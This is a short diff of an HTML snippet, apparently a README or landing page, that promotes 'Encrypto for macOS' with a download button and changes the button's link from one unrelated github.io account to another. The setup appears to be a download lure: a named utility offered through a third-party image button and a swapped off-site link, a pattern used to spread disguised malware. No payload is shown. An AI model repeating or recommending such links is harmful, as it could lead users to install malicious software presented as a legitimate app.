@@ -6,7 +6,7 @@
 <h3>Encrypto for macOS</h3>
 <p>Encrypto is a specialized file encryption and security solution designed for users who want a reliable, Mac‑native tool with clear controls and stable performance.</p>
 
-<a href="https://onanizm-apps-software.github.io/.github/Encrypto">
+<a href="https://deployed-soft.github.io/.github/Encrypto">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
